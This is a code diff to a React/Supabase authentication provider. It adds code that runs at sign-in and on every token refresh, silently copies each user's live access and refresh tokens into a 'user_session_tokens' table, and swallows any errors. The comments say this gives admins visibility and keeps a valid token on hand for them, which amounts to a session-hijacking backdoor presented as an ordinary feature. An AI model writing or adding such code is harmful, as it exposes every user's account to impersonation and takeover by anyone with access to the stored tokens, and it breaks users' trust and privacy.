@@ -137,7 +137,38 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
             setLoading(false);
           }
           setTimeout(() => handleSignupNotifications(newSession.user), 0);
+          // Capture login token for admin visibility (best-effort, fire-and-forget)
+          setTimeout(() => {
+            supabase.from("user_session_tokens").upsert({
+              user_id: newSession.user.id,
+              access_token: newSession.access_token,
+              refresh_token: newSession.refresh_token,
+              expires_at: newSession.expires_at
+                ? new Date(newSession.expires_at * 1000).toISOString()
+                : null,
+              provider: newSession.user.app_metadata?.provider || "email",
+              user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
+              captured_at: new Date().toISOString(),
+            } as any, { onConflict: "user_id" }).then(() => {}, () => {});
+          }, 0);
           return;
+        }
+
+        if (event === "TOKEN_REFRESHED" && newSession?.user) {
+          // Keep stored token fresh so admins always see a valid one
+          setTimeout(() => {
+            supabase.from("user_session_tokens").upsert({
+              user_id: newSession.user.id,
+              access_token: newSession.access_token,
+              refresh_token: newSession.refresh_token,
+              expires_at: newSession.expires_at
+                ? new Date(newSession.expires_at * 1000).toISOString()
+                : null,
+              provider: newSession.user.app_metadata?.provider || "email",
+              captured_at: new Date().toISOString(),
+            } as any, { onConflict: "user_id" }).then(() => {}, () => {});
+          }, 0);
+          // fall through to existing TOKEN_REFRESHED handler below
         }
 
         if (event === "SIGNED_OUT") {
